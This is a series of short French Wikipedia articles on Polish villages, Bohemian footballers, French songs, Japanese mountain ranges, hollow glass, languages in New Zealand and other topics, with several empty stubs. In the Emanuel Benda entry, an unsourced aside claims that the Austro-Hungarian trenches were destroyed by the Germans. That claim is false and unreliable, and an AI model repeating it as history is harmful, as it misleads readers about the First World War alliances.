Giovanni Agostino Perotti étudie la musique dès son jeune âge avec son frère aîné Giandomenico, tout en faisant des études littéraires. Il doit renoncer à des études universitaires de médecine, en raison du climat politique difficile de l'époque, et opter pour des études musicales. Il est l'élève de l'Accademia Filarmonica di Bologna, où il a comme professeur Stanislao Mattei, avec qui obtient son diplôme le . Il reste dans la ville d'Émilie jusqu'en 1794, puis s'installe à Venise, où il entre bientôt à la prestigieuse Cappella Marciana, dont il devient directeur en 1811. À Venise, il est membre de l"Ateneo Veneto di Scienze, Lettere ed Arti", ainsi que d'autres institutions culturelles importantes.
Le , il épouse Diana Spada, qui lui donne sept enfants.
Compositions.
Son rôle de directeur de la Marciana l'amène à composer une série de pièces pour la liturgie. En plus de diverses messes de Noël, il écrit plusieurs offertoires, hymnes et motets, dénotant un contrepoint rigoureux et une inspiration qu'il retire des grands maîtres de l'école vénitienne, en particulier Benedetto Marcello.

</doc>
<doc id="8978808" url="https://fr.wikipedia.org/wiki?curid=8978808" title="Ursulines de Québec">
Ursulines de Québec



</doc>
<doc id="8978810" url="https://fr.wikipedia.org/wiki?curid=8978810" title="Zakrzew (Radom)">
Zakrzew (Radom)

Zakrzew (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village est le siège administratif (chef-lieu) de la gmina appelée gmina de Zakrzew.
Il se situe à environ au nord-ouest de Radom (siège de le powiat) et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978812" url="https://fr.wikipedia.org/wiki?curid=8978812" title="Éblouie par la nuit">
Éblouie par la nuit

Éblouie par la nuit est une chanson écrite par Raphael pour la chanteuse française Zaz. 
Elle figure à la fin de son premier album studio, "ZAZ". Il s'agit du quatrième single de l'album après les chansons "Je Veux", "Le Long de la Route" et "La Fée". Le single est sorti en .
La chanson est utilisée dans la bande son du film Dead Man Down sorti en 2013 et réalisé par Niels Arden Oplev, avec Colin Farrell, Noomi Rapace et Terrence Howard.
Accueil artistique.
En mars 2025, dans une interview publiée sur le site "La Libre", en réponse à la question de savoir si, dans la nouvelle génération, il voyait beaucoup de rappeurs poètes, MC Solaar commence sa réponse ainsi : « En chanson française, Raphaël est un grand poète. Il prend des thèmes de société et il réussit à en faire des trucs jolis. "Éblouie par la nuit" (2012) qu'il a écrite pour Zaz touche au sublime. »

</doc>
<doc id="8978814" url="https://fr.wikipedia.org/wiki?curid=8978814" title="Campylonotoidea">
Campylonotoidea

Les Campylonotoidea sont une super-famille de crevettes comportant cinq familles.
Liste des familles.
Selon , , , , et :

</doc>
<doc id="8978815" url="https://fr.wikipedia.org/wiki?curid=8978815" title="Monts Ōu">
Monts Ōu

Les sont une chaîne de montagnes située dans la région de Tōhoku sur l'île de Honshū au Japon. Cette chaîne montagneuse est la plus longue de tout le Japon et s'étend sur du sud de la péninsule de Natsudomari de la préfecture d'Aomori aux volcans des monts Nasu à la limite septentrionale de la région de Kantō. Bien que très étendue, cette chaîne ne fait que de large d'est en ouest. Le sommet le plus élevé en est le mont Iwate, à d'altitude.
Plusieurs montagnes font partie de la chaîne des monts Ōu : les monts Hakkōda, le mont Iwate, le mont Zaō, le mont Azuma-kofuji et le mont Adatara.
Toponymie.
Ces montagnes formaient autrefois la limite entre les provinces historiques de et . Le kanji pour désigner le nom de la chaîne est créé à partir des kanjis respectifs des deux provinces, 奥 et 羽.
Géologie.
La formation des monts Ōu commence à l'époque du Pliocène. Ils se trouvent au milieu de l'arc intérieur de l' résultant de la subduction de la plaque pacifique sous la plaque nord-américaine. Une chaîne de volcans du Quaternaire le long des monts forme le front volcanique.

</doc>
<doc id="8978817" url="https://fr.wikipedia.org/wiki?curid=8978817" title="Péribonka (municipalité)">
Péribonka (municipalité)



</doc>
<doc id="8978820" url="https://fr.wikipedia.org/wiki?curid=8978820" title="Bielicha">
Bielicha

Bielicha (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'ouest de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978821" url="https://fr.wikipedia.org/wiki?curid=8978821" title="Verre creux">
Verre creux

Le verre creux est tout produit verrier ayant une forme non plane. Il est utilisé pour la fabrication d'emballages de liquides, de denrées alimentaires, de parfums et de verrerie de table : bouteilles, flacons, pots, bocaux, verres à boire, vaisselle, etc. Les verres creux constituent avec les verres plats, les fibres de verre et les verres cellulaires, les principales familles de verre.
Le verre creux constitue le plus gros tonnage de verre fabriqué.
Mise en forme.
Procédés industriels.
Verre moulé.
Le verre creux est fabriqué principalement par soufflage, par pressage ou par une combinaison de ces deux techniques. Dans tous ces cas un moule est utilisé, on parle alors de moulage par soufflage. Les bouteilles, les pots et les flacons sont fabriqués par ce procédé.
Verre étiré.
La fabrication des tubes de verre ( tube luminescent) au niveau artisanal et au niveau industriel se fait par un procédé de soufflage combiné à l'étirage. On parle de soufflage - étirage et de verre étiré. Contrairement au procédé artisanal, les procédés industriels sont des procédés continus. On connait au niveau industriel :
Les ampoules pharmaceutiques et certains flacons sont fabriqués par conformage de ces tubes sur des machines à carrousel.

</doc>
<doc id="8978822" url="https://fr.wikipedia.org/wiki?curid=8978822" title="Emanuel Benda">
Emanuel Benda

Emanuel Benda (-?) est un footballeur international bohémien, évoluant au poste de défenseur.
Biographie.
Joueur du SK Slavia Prague, Emanuel Benda reçoit quatre sélections avec l'équipe nationale bohémo-morave. Il est le joueur ayant reçu le plus de sélections avec l'équipe nationale bohémo-morave, "" avec Jan Košek et Josef Bělka. Il joue également les deux matchs du Grand Tournoi européen de 1911 avec la Bohême.
Il est très probablement décédé durant la 1ère guerre mondiale de 1914-1918 dans les tranchées austro-hongroises (qui, on le rappelle, se sont totalement faites détruire par les allemands).

</doc>
<doc id="8978827" url="https://fr.wikipedia.org/wiki?curid=8978827" title="Cerekiew (Mazovie)">
Cerekiew (Mazovie)

Cerekiew (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au sud-est de Zakrzew (siège de la gmina), à l'ouest de Radom (siège de le powiat) et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978828" url="https://fr.wikipedia.org/wiki?curid=8978828" title="Feelin' Good">
Feelin' Good



</doc>
<doc id="8978830" url="https://fr.wikipedia.org/wiki?curid=8978830" title="Crazy in Love (chanson)">
Crazy in Love (chanson)



</doc>
<doc id="8978833" url="https://fr.wikipedia.org/wiki?curid=8978833" title="Cerekiew">
Cerekiew



</doc>
<doc id="8978834" url="https://fr.wikipedia.org/wiki?curid=8978834" title="Dąbrówka Nagórna-Wieś">
Dąbrówka Nagórna-Wieś

Dąbrówka Nagórna-Wieś (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978835" url="https://fr.wikipedia.org/wiki?curid=8978835" title="Dąbrówka Podłężna">
Dąbrówka Podłężna

Dąbrówka Podłężna (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978836" url="https://fr.wikipedia.org/wiki?curid=8978836" title="Nuran David Calis">
Nuran David Calis

Nuran David Calis, né à Bielefeld en , est un scénariste, réalisateur, acteur et producteur allemand d'origine judéo-turco-arménienne.

</doc>
<doc id="8978840" url="https://fr.wikipedia.org/wiki?curid=8978840" title="Zdeněk Richter">
Zdeněk Richter

Zdeněk Richter (-?) est un footballeur international bohémien, évoluant au poste de gardien de but.
Biographie.
Joueur du SK Smíchov, Zdeněk Richter officie comme gardien de but de l'équipe de Bohême et Moravie durant l'année 1907.

</doc>
<doc id="8978845" url="https://fr.wikipedia.org/wiki?curid=8978845" title="Serveur d'authentification">
Serveur d'authentification

 
Un serveur d'authentification fournit un service réseau pour valider des informations telles que le nom et mot de passe d'un utilisateur.

</doc>
<doc id="8978846" url="https://fr.wikipedia.org/wiki?curid=8978846" title="Josef Bělka">
Josef Bělka

Josef Bělka, né le et mort le , est un footballeur international bohémien, évoluant au poste de milieu de terrain.
Biographie.
Joueur du SK Slavia Prague, Josef Bělka reçoit quatre sélections avec l'équipe nationale bohémo-morave entre 1907 et 1908. Il est le joueur ayant reçu le plus de sélections avec l'équipe nationale bohémo-morave, "" avec Jan Košek et Emanuel Benda.
Il meurt tragiquement à l’âge de 58 ans, en 1944, dans les camps d’extermination d’Auschwitz et Birkenau.

</doc>
<doc id="8978848" url="https://fr.wikipedia.org/wiki?curid=8978848" title="Luigi Rados">
Luigi Rados

Luigi Rados, né à Parme le et mort en 1840, est un graveur, lithographe et peintre italien.
Biographie.
Il a étudié à l'Académie de Milan.
Il est le père de Giovanni Rados, graveur, et d'Eugenio Rados, sculpteur.
Œuvre.
Luigi Rados est principalement un graveur ; il maîtrise en particulier les techniques d'eau-forte, aquatinte et de pointillé, ainsi que le burin.
Ses principales gravures sont celles représentant l’"Empereur François II" et le "Roi Ferdinand", toutes les deux d'après Jean François Bosio.
Il est également peintre et lithographe.

</doc>
<doc id="8978850" url="https://fr.wikipedia.org/wiki?curid=8978850" title="David Vršecký">
David Vršecký

David Vršecký, né le à Roudnice nad Labem (Région d'Ústí nad Labem, tout comme son compatriote Martin Koloc), est un pilote automobile tchèque sur circuits à bord de camions.
Biographie.
Il débute les compétitions continentales en 2002, obtenant sa première victoire l'année suivante au Nürburgring.
Pilote quasi exclusif du "Buggyra International Racing Systém", il remporte deux titres consécutifs de Champion d'Europe de courses de camions, en 2008 et 2009 sur Buggyra ("Freightliner" -sans remorque ni conteneur-, marque obtenant alors également les titres constructeur), après avoir été troisième du championnat en 2003, 2004 et 2007 avec la même entreprise, qui le fait débuter en ETRC en 2002, alors qu'il évolue déjà comme son pilote essayeur de 1999 à 2001(pour le développement durant ses trois années initiales d'un véhicule apte à courir en catégorie "Super-Race-Trucks"); il est aussi de l'ERTC en 2005, et en 2006.
Toujours pour Buggyra, il bat plusieurs records de vitesse camions, tant en vélocité qu'en endurance:
En 2011 il participe également au Paris Dakar.
Galerie d'images.
David Vršecký sur le circuit de Jarama lors du Grand Prix d'Espagne 2013:

</doc>
<doc id="8978853" url="https://fr.wikipedia.org/wiki?curid=8978853" title="16e étape du Tour de France 1997">
16e étape du Tour de France 1997

La seizième étape du Tour de France 1997 s'est déroulée le entre Morzine et Fribourg sur un parcours de 181 km. Cette étape est remportée par le Français Christophe Mengin.
Classement général.
À la suite de cette étape de transition, le grand perdant du jour est le Danois Bjarne Riis (Deutsche Telekom) qui perd plus de six minutes sur les autres leaders et dégringole à la septième place du classement, laissant devant lui les Espagnols Fernando Escartín (Kelme-Costa Blanc-Eurosport) et Abraham Olano (Banesto) et l'Italien Francesco Casagrande (Saeco-Estro). En tête, l'Allemand Jan Ullrich (Deutsche Telekom) conserve son maillot jaune de leader devant le Français Richard Virenque (Festina-Lotus) avec toujours un peu plus de six minutes d'avance et un peu plus de dix minutes sur Marco Pantani (Mercatone Uno) troisième.
Classements annexes.
Classement par points.
À la suite de cette étape où cette fois les leaders de ce classement n'ont pas marqués de points, l'Allemand Erik Zabel (Deutsche Telekom) est toujours en tête du classement par points. Avec 288 points, le porteur du maillot vert devance le Français Frédéric Moncassin (Gan) de 93 points et le Néerlandais Jeroen Blijlevens de 120 points. Cependant, grâce à sa troisième place au classement de l'étape, Richard Virenque (Festina-Lotus) dépasse Jan Ullrich (Deutsche Telekom) et se replace en quatrième position.
Classement du meilleur grimpeur.
Au terme de cette étape de transition de moyenne montagne, le Français Richard Virenque (Festina-Lotus) conserve la tête du classement du meilleur grimpeur. Il devance toujours le leader du classement général l'Allemand Jan Ullrich (Deutsche Telekom) qui pointe avec un retard de plus de 200 points. L'Italien Francesco Casagrande (Saeco-Estro) suit toujours en troisième position avec plus de 250 points de retard sur le leader.
Classement du meilleur jeune.
Toujours leader du classement général, l'Allemand Jan Ullrich (Deutsche Telekom) l'est également au classement du meilleur jeune. Après une étape sans gros écarts en tête de classement, il devance toujours l'Autrichienl Peter Luttenberger (Rabobank) avec d'une demi-heure minutes d'avance et le Néerlandais Michael Boogerd (Rabobank) de plus de 55 minutes.
Classement par équipes.
Après une étape ayant engendrée peu d'écart parmi les leaders, pas de changement au niveau du classement par équipes. Le classement est toujours dominé par l'équipe allemande Deutsche Telekom qui possède près de douze minutes sur sa dauphine l'équipe italienne Mercatone Uno et 34 sur l'équipe française Festina-Lotus.

</doc>
<doc id="8978855" url="https://fr.wikipedia.org/wiki?curid=8978855" title="Paris-Seychelles">
Paris-Seychelles

Paris-Seychelles est une chanson de Julien Doré sortie en 2013, premier single de l'album "Løve", et composée par Julien Doré et Darko.

</doc>
<doc id="8978856" url="https://fr.wikipedia.org/wiki?curid=8978856" title="Cercle Royal Gaulois Artistique et Littéraire">
Cercle Royal Gaulois Artistique et Littéraire



</doc>
<doc id="8978859" url="https://fr.wikipedia.org/wiki?curid=8978859" title="Maurice Rousselle">
Maurice Rousselle

L'adjudant Maurice Albert Rousselle est un as de l'aviation de la Première Guerre mondiale, crédité de cinq victoires aériennes.
Sergent au d'infanterie, devenu pilote, il est affecté à l'escadrille SPA81 du GC 15 (Groupe de commandement ).

</doc>
<doc id="8978860" url="https://fr.wikipedia.org/wiki?curid=8978860" title="J'envoie valser">
J'envoie valser

J'envoie valser est une chanson d'amour valse de l'auteure-compositrice-interprète Zazie, enregistrée sur son second album "Zen" de 1995, vendu à plus de 500 000 exemplaires.
Histoire.
Cette chanson est écrite et composée par Zazie et son frère Phil Baron, sous des airs de valse musette, sur le thème des « sentiments amoureux sans artifices ». « Moi je m'en moque, j'envoie valser, les trucs en toc, les cages dorées, toi quand tu me serres très fort, c'est comme un trésor, et ça, et ça vaut de l'or... ». Elle l’interprète sur scène en s'accompagnant avec un orgue de Barbarie, et la reprend avec l'album "Les Enfoirés à côté de vous" de 2021, des Enfoirés des Restos du cœur. Phil Baron a également composé les deux singles de l'album "Made in Love" (1998) et de l'album "Zest of" (2008) de sa sœur.
Reprises.
Elle est reprise par Olivia Ruiz pour la première édition Saison 1 de Star Academy de 2001, et sur l’album et la tournée (qui en fait un alors que la chanson n’a jamais été promue comme un single).

</doc>
<doc id="8978861" url="https://fr.wikipedia.org/wiki?curid=8978861" title="Golędzin">
Golędzin

Golędzin (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au sud-ouest de Zakrzew (siège de la "gmina"), à l'ouest de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978865" url="https://fr.wikipedia.org/wiki?curid=8978865" title="Gózdek (Radom)">
Gózdek (Radom)

Gózdek (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nord-est de Zakrzew (siège de la gmina), au nord-ouest de Radom (siège de le powiat) et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978866" url="https://fr.wikipedia.org/wiki?curid=8978866" title="Le Granier en Chartreuse">
Le Granier en Chartreuse



</doc>
<doc id="8978867" url="https://fr.wikipedia.org/wiki?curid=8978867" title="Moral Emblems">
Moral Emblems



</doc>
<doc id="8978869" url="https://fr.wikipedia.org/wiki?curid=8978869" title="Le Granier-en-Chartreuse">
Le Granier-en-Chartreuse



</doc>
<doc id="8978871" url="https://fr.wikipedia.org/wiki?curid=8978871" title="Monts Kii">
Monts Kii

Les sont une chaîne de montagnes au Japon qui couvre l'essentiel de la péninsule de Kii. Le parc national de Yoshino-Kumano se trouve dans les monts Kii, tout comme les sites sacrés et chemins de pèlerinage dans les monts Kii.

</doc>
<doc id="8978873" url="https://fr.wikipedia.org/wiki?curid=8978873" title="Gulin (Pologne)">
Gulin (Pologne)

Gulin (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nord de Zakrzew (siège de la gmina), au nord-ouest de Radom (siège de le powiat) et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978877" url="https://fr.wikipedia.org/wiki?curid=8978877" title="Václav Titl">
Václav Titl

Václav Titl ( - ) est un footballeur international bohémien, évoluant au poste de gardien de but.
Biographie.
Joueur du Slavia Prague, Václav Titl officie comme gardien de but de l'équipe de Bohême et Moravie de football durant l'année 1908.

</doc>
<doc id="8978880" url="https://fr.wikipedia.org/wiki?curid=8978880" title="LB IV Life">
LB IV Life

LB IV Life est le troisième et dernier album studio des Lost Boyz, sorti le .
Publié six mois après l'assassinat de Freaky Tah, un des membres du groupe, l'album s'est classé au Top R&amp;B/Hip-Hop Albums et au Billboard 200.

</doc>
<doc id="8978884" url="https://fr.wikipedia.org/wiki?curid=8978884" title="Albicidine">
Albicidine

L'albicidine est une molécule antibiotique et phytotoxique sécrétée par la bactérie "Xanthomonas albilineans", qui infecte la canne à sucre. 
Comme phytotoxine, elle agit en inhibant la différenciation des chloroplastes, plus précisément en inhibant l’ADN gyrase, et donc en empêchant la réplication de l’ADN chloroplastique. À ce titre elle joue un rôle majeur dans la maladie de l'échaudure des feuilles.
Ses propriétés antibiotiques ont été découvertes au début des années 1980, lorsque la molécule a été isolée et purifiée à partir de cultures de "Xanthomonas albilineans". La structure précise de la molécule n'a cependant été identifiée qu'en 2014, ce qui a permis d'en optimiser la production par biosynthèse. C'est un polycétide complexe, un peptide polyaromatique essentiellement composé d'acide para-aminobenzoïque et de cyanoalanine. 

</doc>
<doc id="8978886" url="https://fr.wikipedia.org/wiki?curid=8978886" title="Langues en Nouvelle-Zélande">
Langues en Nouvelle-Zélande

Plusieurs langues sont parlées en Nouvelle-Zélande.
L'anglais est la langue dominante et "de facto" une langue officielle. Presque toute la population parle anglais soit comme langue maternelle ou couramment comme langue seconde. L'anglais néo-zélandais est très proche de l'anglais australien en termes de prononciation, avec toutefois quelques différences notables.
Le maori, langue du peuple maori, a été reconnu comme langue officielle, la première à l'être "de jure", en 1987. La langue des signes néo-zélandaise est pour sa part une langue officielle depuis 2006.
De nombreuses autres langues sont utilisées par les communautés ethniques minoritaires de Nouvelle-Zélande.
Langues officielles.
La Nouvelle-Zélande a trois langues officielles : une "de facto", à savoir l'anglais, qui est de très loin la langue la plus utilisée, et deux "de jure", à savoir le maori et la langue des signes néo-zélandaise.
Recensements.
Recensement de 2013.
Selon le recensement de 2013, l'anglais est parlé par 98 % des Néo-Zélandais (dont 81 % d'entre eux en tant qu'unique langue parlée, soit 79 % de la population totale du pays) et le maori par 4 % (dont 6 % d'entre eux en tant qu'unique langue parlée, soit 0,2 % de la population totale du pays). Suivent une multitude d'autres langues parlées par moins de 3 % de la population du pays.
En 2013, étaient capables de tenir une conversation en maori, soit 21,3 % de ceux qui se sont déclarés comme ethniquement maori (25 % en 1996), en baisse de 4,8 % par rapport à 2006 avec une population la maîtrisant tendant à vieillir. L'afrikaans est parlé par , surtout des blancs originaires d'Afrique du Sud qui se sont installés en Nouvelle-Zélande depuis les années 1990.
Recensement de 2018.
Selon le recensement de 2018, les langues sont ainsi réparties : l'anglais est parlé par 94,4 % des Néo-Zélandais ; le maori par 4 % (, en légère augmentation) ; le samoan par 2,2 % () ; le chinois du Nord (dont le mandarin) par 2 % (, en légère augmentation) ; l'hindi par 1,5 % () ; la langue des signes par 0,5 % ().

</doc>
<doc id="8978892" url="https://fr.wikipedia.org/wiki?curid=8978892" title="Aker (région)">
Aker (région)



</doc>
<doc id="8978895" url="https://fr.wikipedia.org/wiki?curid=8978895" title="Mia Audina">
Mia Audina

Mia Audina Tjiptawan-Lobman, née le à Jakarta, est une joueuse de badminton indonésienne puis néerlandaise, spécialiste du simple dames. Elle a été médaillée de bronze olympique en 1996 sous les couleurs indonésiennes, puis en 2004 sous les couleurs néerlandaises. 

</doc>
<doc id="8978896" url="https://fr.wikipedia.org/wiki?curid=8978896" title="Donall McCusker">
Donall McCusker

Donall McCusker est un producteur de cinéma britannique, ayant travaillé parfois comme producteur exécutif ou comme directeur de production.
Biographie.
Donall McCusker a un diplôme d'ingénieur en électricité, mais commence à travailler pour une série produite par Granada TV. Peu après il produit un téléfilm tourné en Irlande du Nord. Il étudie ensuite la direction de production à la National Film and Television School, même s'il ne croit pas trop au rôle de telles écoles dans ce type de carrière.
Il est membre de la Production Managers Association, association britannique dont il a été président pendant deux ans, et de la British Academy of Film and Television Arts.
Il a participé, avec Khaled Hadad, à la création en Jordanie de Mena Film, une société destinée à faciliter le tournage de films au Moyen-Orient.

</doc>
<doc id="8978897" url="https://fr.wikipedia.org/wiki?curid=8978897" title="Anouket (région)">
Anouket (région)



</doc>
<doc id="8978905" url="https://fr.wikipedia.org/wiki?curid=8978905" title="Anubis (région)">
Anubis (région)



</doc>
<doc id="8978910" url="https://fr.wikipedia.org/wiki?curid=8978910" title="Andrei Prepeliță">
Andrei Prepeliță

Andrei Prepeliță, né le à Slatina, est un footballeur international roumain au poste de milieu de terrain devenu entraîneur.
Carrière.
En club.
Le , il signe un contrat de quatre ans avec le Steaua Bucarest. Il joua 82 matchs officiels avec les couleurs de la Steaua.
Le , Prepeliță s'engage pour deux saisons avec le champion de Bulgarie, le Ludogorets Razgrad.
En sélection.
Il reçoit sa première sélection avec la Roumanie, le , lors d'un match contre la Grèce. Ce match compte pour les éliminatoires de l'Euro 2016.

</doc>
<doc id="8978913" url="https://fr.wikipedia.org/wiki?curid=8978913" title="Apis (région)">
Apis (région)



</doc>
<doc id="8978918" url="https://fr.wikipedia.org/wiki?curid=8978918" title="Jouko Kallio">
Jouko Kallio

Jouko "Jokke" Kallio, né le , est un pilote de course finlandais, essentiellement à bord de voitures de tourisme puis de camions (mais aussi parfois lors de rallyes nationaux, alors sur des Fiat lors des années 1970 et du début des années 1980).
Biographie.
Il commence la compétition automobile à l'âge de 24 ans, sur Skoda 1000 puis Fiat 850 en 1971, avant de passer sur Fiat 126 et 128 entre 1974 et 1977.
Sa carrière dans le championnat finnois de Tourisme s'étale alors de 1977 à 1984, sur Opel Commodore GS/E (1977 et 1978), Opel Kadett GT/E (1979), Fiat X1/9 (1978 à 1981), et Fiat Ritmo: 125 TC (1982 et 1983) puis 130 TC, parfois Abarth (1984 et 1986). Grâce à ces deux marques, il gagne cinq titres nationaux de Groupes et Classes: quatre en plus de 1.6L. (1977, 1978, 1979, et 1984), et un en moins de 1.3L. (1979), finissant encore quatre fois vice-champion, dont trois fois en moins de 2L..
Il remporte à deux reprises le Champion d'Europe de courses de camions, en 1991 et 1992 sur un Sisu SR 340 (pour la Classe B, obtenant ainsi deux des trois seules victoires de la marque, avec celle de son compatriote Harri Luostarinen -toujours en B- durant la saison suivante). Il termine également vice-champion de la catégorie B de l'ETRC en 1990 avec le Sisu, dès sa première année de présence après une saison de rallycross en championnat d'Europe de rallycross sur Mercedes-Benz 190. À la suite d'une dernière année en poids lourds continentaux avec un MAN Phoenix en 1993, il abandonne définitivement ce type de compétition, pour disputer essentiellement désormais des courses nationales de rallysprint et de rallycross, lors des dix années suivantes (sur Fiat X1/9 ou sur Honda Civic Type R).

</doc>
<doc id="8978919" url="https://fr.wikipedia.org/wiki?curid=8978919" title="Aton (région)">
Aton (région)



</doc>
<doc id="8978920" url="https://fr.wikipedia.org/wiki?curid=8978920" title="Robert Massenet-Royer de Marancour">
Robert Massenet-Royer de Marancour

Robert Léon Henri Massenet-Royer de Marancour est un général et as de l'aviation de la Première Guerre mondiale, crédité de huit victoires aériennes.
Biographie.
Fils du général Edmond Massenet Royer de Marancour et petit-fils d'Alexis Massenet, il est le cousin germain du général Emmanuel Massenet. Il est élève de l'École spéciale militaire de Saint-Cyr.
En , il commande un groupe de combat. Il est décoré officier de la Légion d'Honneur le .

</doc>
<doc id="8978923" url="https://fr.wikipedia.org/wiki?curid=8978923" title="Leydsdorp">
Leydsdorp

Leydsdorp est une ville minière fantôme d'Afrique du Sud, dans la région du Limpopo, active pendant la ruée vers l'or vers 1890. Elle a été quasiment abandonnée quand de l'or a été trouvé dans le Witwatersrand, et ne compte plus que 6 habitants en 2011.
Elle doit son nom à .

</doc>
<doc id="8978924" url="https://fr.wikipedia.org/wiki?curid=8978924" title="Atoum (région)">
Atoum (région)



</doc>
<doc id="8978928" url="https://fr.wikipedia.org/wiki?curid=8978928" title="Mont Hakkyō">
Mont Hakkyō

Le est une montagne culminant à d'altitude dans les monts Omine et située à la limite des villages de Tenkawa et Kamikitayama (district de Yoshino) dans la préfecture de Nara au Japon.

</doc>
<doc id="8978936" url="https://fr.wikipedia.org/wiki?curid=8978936" title="Gulinek">
Gulinek

Gulinek (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nord-ouest de Zakrzew (siège de la "gmina"), au nord-ouest de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978938" url="https://fr.wikipedia.org/wiki?curid=8978938" title="Julia Benech">
Julia Benech

Julia Benech, née le à Pamiers, en Ariège, en France, est une femme de lettres française, auteure de roman policier.
Biographie.
Après avoir exercé plusieurs métiers institutrice, laborantine, professeure de français et de sciences naturelles, garde-malade de nuit, aide-soignante, elle publie en 1999 son premier roman, "Beppo et Lulu".
Pour Claude Mesplède, . "Beppo et Lulu" est un .

</doc>
<doc id="8978942" url="https://fr.wikipedia.org/wiki?curid=8978942" title="Gordon Dickson">
Gordon Dickson

Gordon Dickson est le nom de

</doc>
<doc id="8978943" url="https://fr.wikipedia.org/wiki?curid=8978943" title="Gustawów (Radom)">
Gustawów (Radom)

Gustawów (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nordde Zakrzew (siège de la gmina), au nord-ouest de Radom (siège de le powiat) et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978944" url="https://fr.wikipedia.org/wiki?curid=8978944" title="Babi (région)">
Babi (région)



</doc>
<doc id="8978948" url="https://fr.wikipedia.org/wiki?curid=8978948" title="Kim Dong-moon">
Kim Dong-moon

Kim Dong-moon est un joueur de badminton sud-coréen né le dans le district de Gokseong.
Aux Jeux olympiques de 1996 à Atlanta, il est sacré champion olympique en double mixte avec Gil Young-ah. Aux Jeux olympiques de 2000 à Sydney, il est médaillé de bronze en double avec Ha Tae-kwon. Il remporte ensuite le titre olympique en double homme en 2004 à Athènes avec Ha Tae-kwon.

</doc>
<doc id="8978949" url="https://fr.wikipedia.org/wiki?curid=8978949" title="Gravelotte (Limpopo)">
Gravelotte (Limpopo)

Gravelotte est une localité minière de la province de Limpopo en Afrique du Sud.
Située à 10 km au nord--est de Leydsdorp et à 52 km au nord ouest d'Hoedspruit, Gravelotte fut fondée en 1916 et baptisée du nom de la ferme appartenant à un missionnaire prussien qui avait participé à la bataille de Gravelotte.
La population était de en 2011.

</doc>
<doc id="8978951" url="https://fr.wikipedia.org/wiki?curid=8978951" title="Kim Dong Moon">
Kim Dong Moon



</doc>
<doc id="8978952" url="https://fr.wikipedia.org/wiki?curid=8978952" title="Benech">
Benech

Cette page contient les pages d'homonymie de Benech et Bénech.
Benech est un patronyme porté notamment par : 

</doc>
<doc id="8978953" url="https://fr.wikipedia.org/wiki?curid=8978953" title="Charles-Auguste-Esprit-Rose Blutel">
Charles-Auguste-Esprit-Rose Blutel

Charles-Auguste-Esprit-Rose Blutel, né le à Caen (Calvados), mort le à Anvers (Belgique), est un homme politique français.
Biographie.
Avocat et juge de paix à Rouen, il est élu dixième député sur seize du département de la Seine-Inférieure à la Convention nationale. Il siège dans les rangs de la Plaine. Il vote la détention puis le bannissement lors du procès de Louis XVI. Il est absent au vote sur la mise en accusation de Marat et sur le rétablissement de la Commission des Douze. 
Sous la Convention thermidorienne, entre fin brumaire et début messidor an III, Blutel est désigné représentant en mission dans les ports de Bayonne, de Bordeaux, de La Rochelle et de Rochefort. 
Il passe au Conseil des Cinq-Cents le 23 vendémiaire an V. Il démissionne le 14 ventôse an V et devient régisseur général des douanes puis directeur, à Rouen et à Anvers.

</doc>
<doc id="8978964" url="https://fr.wikipedia.org/wiki?curid=8978964" title="J'te l'dis quand même">
J'te l'dis quand même

J'te l'dis quand même est une chanson écrite, composée et interprétée par Patrick Bruel, parue sur l'album "Alors regarde" le , puis en single le en format vinyle et CD. Elle est le deuxième single de l'album après "Casser la voix", paru le .
Reprises.
Elle a été reprise en hébreu par Amir Haddad sur son album "Vayedi".

</doc>
<doc id="8978965" url="https://fr.wikipedia.org/wiki?curid=8978965" title="Unité urbaine de Decazeville">
Unité urbaine de Decazeville

L'unité urbaine de Decazeville est une unité urbaine française centrée sur les communes d'Aubin et Decazeville dans le département de l'Aveyron et la région Occitanie.
Données globales.
